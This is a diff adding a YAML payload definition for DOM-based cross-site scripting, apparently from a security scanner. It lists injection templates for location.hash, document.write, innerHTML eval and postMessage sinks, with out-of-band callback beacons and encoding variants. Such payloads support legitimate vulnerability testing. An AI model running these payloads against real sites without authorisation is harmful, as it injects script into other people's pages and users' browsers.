@@ -1,0 +1,43 @@
+family_id: xss_dom
+description: >-
+  DOM-based XSS probes targeting client-side sinks — location.hash sinks,
+  document.write, innerHTML assignments, and postMessage/LocalStorage
+  clobbering vectors (CWE-79).
+cwe_ids: [79]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: location_hash_sink
+    template: "#<img src=x onerror=alert({canary})>"
+    confidence: suspected
+    notes: Fragment-embedded payload; triggers when location.hash flows into innerHTML.
+  - id: document_write_sink
+    template: "'); document.write('<img src=//{oast_host}/{canary}>');//"
+    confidence: suspected
+    notes: Closes an existing script string then calls document.write with OAST beacon.
+  - id: innerhtml_eval
+    template: "<img src=x onerror='eval(atob(\"{canary_b64}\"))'>"
+    confidence: suspected
+    notes: innerHTML sink executing eval; canary confirmed via OAST or console reflection.
+  - id: postmessage_clobber
+    template: '{"data":"<img src=//{oast_host}/{canary}>"}'
+    confidence: suspected
+    notes: postMessage data object; triggers when receiver unsafely writes data to DOM.
+mutations:
+  - name: sink_swap
+    description: Rotate through innerHTML, outerHTML, insertAdjacentHTML sink variants.
+  - name: proto_clobber
+    description: Add __proto__ or constructor.prototype clobbering prepends.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw DOM sink payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for hash or query-string DOM sources.
+  - name: base64
+    stages: [base64]
+    description: Base64-encoded; useful for atob-based DOM eval sinks.
